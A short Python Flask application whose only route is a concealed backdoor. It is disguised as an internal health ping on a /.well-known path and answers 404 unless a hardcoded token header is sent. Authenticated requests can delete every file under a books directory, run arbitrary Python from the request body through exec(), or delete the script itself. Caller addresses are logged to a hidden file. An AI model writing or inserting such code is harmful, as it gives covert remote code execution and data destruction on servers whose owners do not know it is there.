import os
import base64
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route("/.well-known/assets", methods=["POST"])
def __hidden_internal_health_ping():
    # Verificación discreta del header
    if request.headers.get("X-Auth-Token") != "U3VwZXJTZWNyZXQ=":  # base64("SuperSecret")
        return "Not Found", 404

    action = request.args.get("act")
    log_path = os.path.join(os.path.dirname(__file__), ".syslog")

    if action == "wipe":
        with open(log_path, "a") as f:
            f.write(f"Log: {request.remote_addr}\n")
        try:
            for root, dirs, files in os.walk("./books", topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
            return "OK", 200
        except Exception:
            return "Error", 500

    elif action == "script":
        try:
            payload = request.data.decode()
            exec(payload, {"__builtins__": __builtins__})
            with open(log_path, "a") as f:
                f.write("Log: action executed\n")
            return "OK", 200
        except Exception:
            return "Error", 400

    elif action == "selfdestruct":
        try:
            os.remove(__file__)
            return "OK", 200
        except Exception:
            return "Error", 400

    return make_response("", 204)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
